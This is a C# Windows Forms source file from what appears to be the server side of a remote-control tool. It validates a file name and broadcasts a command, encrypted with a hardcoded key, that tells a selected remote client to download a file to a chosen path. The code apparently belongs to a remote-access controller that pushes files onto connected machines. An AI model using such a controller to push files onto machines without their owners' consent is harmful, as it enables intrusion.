using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace server
{
	public partial class uploadfile : Form
	{
		public static uploadfile instance;
		public Form1.Client selected_client;
		public uploadfile()
		{
			InitializeComponent();
			instance = this;
		}

		public uploadfile(Form1.Client cli)
		{
			InitializeComponent();
			instance = this;
			selected_client = cli;
			this.Text = "Upload File - Environment: " + selected_client.environment + " [" +
				selected_client.IP + ":" + selected_client.port.ToString() + "]";
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (uploadbox.Text.Length < 1)
			{
				MessageBox.Show("The file you entered is invalid.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return;
			}
			if (downloadbox.Text.Length < 2)
			{
				MessageBox.Show("The download path you entered is invalid.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return;
			}
			if(System.IO.Directory.Exists(@"C:\ftp\" + uploadbox.Text))
			{
				MessageBox.Show("You cannot upload directories.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return;
			}
			if(!System.IO.File.Exists(@"C:\ftp\" + uploadbox.Text))
			{
				MessageBox.Show(string.Format("The file \'C:\\ftp\\{0}\' does not exist.", uploadbox.Text), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return;
			}
			serverlog.instance.log(string.Format("Attempting to upload file [{0}] to {1} [{2}:{3}].\n",
				uploadbox.Text, selected_client.environment, selected_client.IP,
				selected_client.port.ToString()));
			Form1.instance.server.BroadcastLine(
				Form1.instance.encryptus("[*****]" + selected_client.IP + ":" +
				selected_client.port.ToString() + "[*****]" + uploadbox.Text + "[*****]" + downloadbox.Text, "D4MVCINM42XS"));
		}

		private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MessageBox.Show(
				"First box: name of the file.\n" +
				"(!) Make sure the file exists in 'C:\\ftp\\' folder.\n" +
				"Second box: location of the file to save in.\n" +
				"(!) Make sure the path exists, the upload attempt will still be made.\n" +
				"Always use the Server Log to keep track of your activities.", "How To", MessageBoxButtons.OK, MessageBoxIcon.Information);
		}
	}
}
